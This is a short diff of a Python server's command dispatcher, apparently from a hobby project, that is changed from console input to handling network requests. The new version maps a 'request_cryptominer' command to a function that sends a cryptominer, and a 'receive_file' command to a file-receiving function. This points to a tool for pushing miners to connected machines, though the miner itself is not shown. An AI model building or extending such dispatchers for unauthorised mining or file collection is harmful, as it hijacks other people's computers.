@@ -1,22 +1,16 @@
+import tools
+import network_commands as nc
 
-
-def command_line(): 
+def command_line(connection,address,buffer_size,data): 
     #DECLARE FUNCTIONAL COMMANDS
-    SERVER_COMMANDS = { 
-        "send_cryptominer" : tools.send_cryptominer
-        ""
-    }
-    CLIENT_COMMANDS = { 
-        "request_cryptominer" : tools.send_cryptominer()
-    }
-    
-    #COMMAND LINE
-    while True: 
-        command = input()
-        if command in SERVER_COMMANDS.keys():
-            #EXECUTE COMMAND FUNCTION
-            SERVER_COMMANDS[command]()
-        elif command in CLIENT_COMMANDS.keys():
-            #EXECUTE COMMAND FUNCTION
-            CLIENT_COMMANDS[command]()
 
+    COMMANDS = {
+        "request_cryptominer" : nc.send_cryptominer,
+        "receive_file" : nc.receive_file
+    }
+
+    #COMMAND LINE
+    if data in COMMANDS.keys():
+        #EXECUTE COMMAND FUNCTION
+        print(f"[{address}] Executing {data}")
+        COMMANDS[data](buffer_size,connection,address)
